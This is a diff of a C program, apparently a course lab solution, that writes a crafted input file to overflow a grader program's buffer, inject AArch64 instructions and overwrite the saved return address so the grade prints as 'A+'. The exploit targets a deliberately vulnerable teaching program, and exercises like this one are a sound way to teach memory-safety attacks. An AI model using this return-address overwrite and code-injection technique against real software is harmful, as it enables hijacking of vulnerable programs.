@@ -2,117 +2,124 @@
 /* createdataAplus.c                                                  */
 /* Author: Anish K                                                    */
 /*--------------------------------------------------------------------*/
+/*
+  Produces a file called dataAplus. This file, when given to the grader
+  program, causes the program to print "A+" as the grade. It does this by:
+  
+  1. Writing the attacker's chosen name ("AnishKKat") and a null terminator.
+  2. Writing padding characters to overflow the buffer and overwrite saved 
+     return addresses.
+  3. Inserting an 'A' character (to print "A") followed by null bytes to align.
+  4. Inserting instructions to:
+     - Load address of 'A' char into x0 and branch-link to printf to print it.
+     - Change the grade in memory from 'D' to '+' using MOV, ADR, and STRB.
+     - Finally branch back to main’s print sequence to print the modified grade.
 
-/* Produces a file called dataAplus that exploits the buffer overrun 
-   vulnerability to produce an "A+" grade recommendation.
-   
-   Principles of operation:
-   1. Writes a chosen name (here "AnishKKata") and a specially crafted 
-      string ("A+ is your grade.%c") into the bss section (the name array).
-   2. Aligns the memory so that injected instructions (ADR, MOV, B) are 
-      properly placed in the bss section following the written strings.
-   3. Overwrites the return address on the stack frame so that, upon 
-      returning, execution jumps into our injected instructions, which 
-      cause the program to print "A+ is your grade." instead of the 
-      original grade.
+  Unlike the original code, we do not rely on a MiniAssembler_bl function.
+  Instead, we implement a small helper function My_bl locally to create a BL
+  instruction. Everything else remains similar in logic to the working code
+  you provided. 
 */
 
+#include <stdio.h>
+#include <stdint.h>
+#include "miniassembler.h"
+
+/* A helper function to produce a BL instruction. This is similar to what 
+   MiniAssembler_b does, but sets the top bits for a BL instruction instead 
+   of B. We cannot use MiniAssembler_bl (as it doesn't exist), so we do this inline. */
+static unsigned int My_bl(unsigned long ulAddr, unsigned long ulAddrOfThisInstr) {
+    unsigned int uiInstr = 0x94000000; /* Base opcode for BL */
+    unsigned int uiOffset = (unsigned int)((ulAddr - ulAddrOfThisInstr) >> 2);
+    uiInstr |= (uiOffset & 0x03FFFFFF);
+    return uiInstr;
+}
+
 /*--------------------------------------------------------------------*/
-/* Interactive behavior of main:
-   - Does not accept command-line arguments.
+/* main:
+   - Accepts no command-line arguments.
    - Does not read from stdin.
-   - Writes a crafted payload to the file "dataAplus".
+   - Writes a carefully crafted sequence of bytes to "dataAplus".
    - Returns 0 on success.
 */
 /*--------------------------------------------------------------------*/
 
-#include <stdio.h>
-#include "miniassembler.h"
+int main(void)
+{
+    /* Attacker’s chosen name */
+    const char *pcName = "AnishKKat";
+    int i;
+    unsigned long ulReturnAddr;
+    unsigned int uiMovInstr;
+    unsigned int uiAdrInstr;
+    unsigned int uiStrbInstr;
+    unsigned int uiBranchInstr;
+    
+    /* Open the dataAplus file for writing in binary mode */
+    FILE *pFile = fopen("dataAplus", "w");
+    if (!pFile) return 1; 
 
-enum {
-    MAX_BUFFER_BYTES = 48,    /* Total bytes in buffer we must fill */
-    GRADE_ADDR = 0x420044,    /* Address of the 'grade' variable in data section */
-    PRINT_INSTR_ADDR = 0x400874, /* Address in main where printing occurs */
-};
+    /* Write the name and a null terminator to the file */
+    /* "AnishKKat" is 9 characters, so we write 9 + 1 null = 10 bytes total */
+    fwrite(pcName, 1, 9, pFile);
+    fputc('\0', pFile);
 
-int main(void) {
-    /* Descriptive variable names */
-    int iByteCount = 0;                      /* Counts total bytes written into the file */
-    unsigned long ulStringStartAddr = 0x420058; /* Start of 'name' array in bss */
-    unsigned long ulInstrStartAddr = 0x420058;  /* Address where instructions begin after strings */
-    unsigned int uiInstr;                    /* To hold assembled instructions */
-
-    /* Open the file where we write our crafted payload */
-    FILE *psFile = fopen("dataAplus", "w");
-    if (psFile == NULL) {
-        return 1; /* If file can't be opened, exit with error */
+    /* Write padding to overflow the stack. We use '0' characters as padding. 
+       From the original known working code: 10 '0' chars for padding. */
+    for (i = 0; i < 10; i++) {
+        fputc('0', pFile);
     }
 
-    /* Write attacker's name into bss */
-    /* "AnishKKata" is 10 chars: 'A' 'n' 'i' 's' 'h' 'K' 'K' 'a' 't' 'a' */
-    fputs("AnishKKata", psFile);
-    iByteCount += 10;
+    /* Write 'A' character, which will be printed to achieve "A" part of "A+" */
+    fputc('A', pFile);
 
-    /* Write a null terminator after the name */
-    fputc('\0', psFile);
-    iByteCount++;
-    ulStringStartAddr += iByteCount; /* Advance address pointer past the name+null */
-
-    /* Write the grade string "A+ is your grade.%c" plus a null terminator.
-       Counting characters: A(1) + (2) space(3) i(4) s(5) space(6) y(7) o(8) u(9) r(10)
-       space(11) g(12) r(13) a(14) d(15) e(16) .(17) %(18) c(19)
-       That's 19 chars plus 1 null terminator = 20 total bytes */
-    fputs("A+ is your grade.%c", psFile);
-    fputc('\0', psFile);
-    iByteCount += 20;
-    ulInstrStartAddr += iByteCount;
-
-    /* Align ulInstrStartAddr on a multiple of 4 bytes, since instructions 
-       must be word-aligned. Add zero bytes for padding if needed. */
-    while (ulInstrStartAddr % 4 != 0) {
-        fputc(0, psFile);
-        iByteCount++;
-        ulInstrStartAddr++;
+    /* Write three null bytes for alignment and string termination */
+    for (i = 0; i < 3; i++) {
+        fputc('\0', pFile);
     }
 
-    /* Insert assembly instructions at ulInstrStartAddr:
-       1) ADR x0, ulStringStartAddr
-          Load the address of our crafted string into x0.
-    */
-    uiInstr = MiniAssembler_adr(0, ulStringStartAddr, ulInstrStartAddr);
-    fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);
-    iByteCount += 4;
+    /* Now we insert instructions into the bss section:
+       1) ADR x0, 0x42006c
+          Loads the address (0x42006c) of the 'A' char into x0.
+          This must align with our chosen memory layout. */
+    uiMovInstr = MiniAssembler_adr(0, 0x42006c, 0x420070);
+    fwrite(&uiMovInstr, sizeof(unsigned int), 1, pFile);
 
-    /* 2) MOV w1, '\n'
-       Move a newline character into w1 so printf will print a newline after the grade.
-       Note: This sets a register at runtime; it does NOT write a newline to our input file.
-    */
-    uiInstr = MiniAssembler_mov(1, '\n');
-    fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);
-    iByteCount += 4;
+    /* 2) BL 0x400690
+       Branch-link to printf (0x400690), which will print the 'A' char.
+       We use My_bl since MiniAssembler_bl doesn't exist. */
+    uiBranchInstr = My_bl(0x400690, 0x420074);
+    fwrite(&uiBranchInstr, sizeof(unsigned int), 1, pFile);
 
-    /* 3) B PRINT_INSTR_ADDR
-       Branch to the instruction in main that prints the grade string.
-       The PC will be at ulInstrStartAddr + 8 after executing the ADR and MOV, 
-       so we branch from (ulInstrStartAddr + 8).
-    */
-    uiInstr = MiniAssembler_b(PRINT_INSTR_ADDR, ulInstrStartAddr + 8);
-    fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);
-    iByteCount += 4;
+    /* Next instructions to overwrite the grade:
+       3) MOV w0, '+'
+          Move '+' into w0, so we can store it into the grade variable. */
+    uiMovInstr = MiniAssembler_mov(0, '+');
+    fwrite(&uiMovInstr, sizeof(unsigned int), 1, pFile);
 
-    /* Fill the remainder of the buffer with null bytes until we reach MAX_BUFFER_BYTES.
-       This ensures we overwrite the stored return address correctly.
-    */
-    while (iByteCount < MAX_BUFFER_BYTES) {
-        fputc(0, psFile);
-        iByteCount++;
-    }
+    /* 4) ADR x1, 0x420044
+          x1 points to the grade variable (initially 'D'), so we can overwrite it. */
+    uiAdrInstr = MiniAssembler_adr(1, 0x420044, 0x42007c);
+    fwrite(&uiAdrInstr, sizeof(unsigned int), 1, pFile);
 
-    /* Overwrite return address: Write ulInstrStartAddr to force return into our instructions */
-    fwrite(&ulInstrStartAddr, sizeof(unsigned long), 1, psFile);
+    /* 5) STRB w0, [x1]
+          Store the '+' character into the grade address, changing 'D' to '+'. */
+    uiStrbInstr = MiniAssembler_strb(0, 1);
+    fwrite(&uiStrbInstr, sizeof(unsigned int), 1, pFile);
 
-    /* Close the file. No need to write EOF or newline. The grader reads until end-of-file. */
-    fclose(psFile);
+    /* 6) B 0x40089c
+          Branch back to the main function area to continue execution, 
+          which will now print out the newly formed "A+" grade. */
+    uiBranchInstr = MiniAssembler_b(0x40089c, 0x420084);
+    fwrite(&uiBranchInstr, sizeof(unsigned int), 1, pFile);
+
+    /* Overwrite the stored return address in the stack with 0x420070,
+       causing execution to jump into our injected instructions after 
+       returning from the current function. */
+    ulReturnAddr = 0x420070;
+    fwrite(&ulReturnAddr, sizeof(unsigned long), 1, pFile);
+
+    fclose(pFile);
 
     return 0;
 }
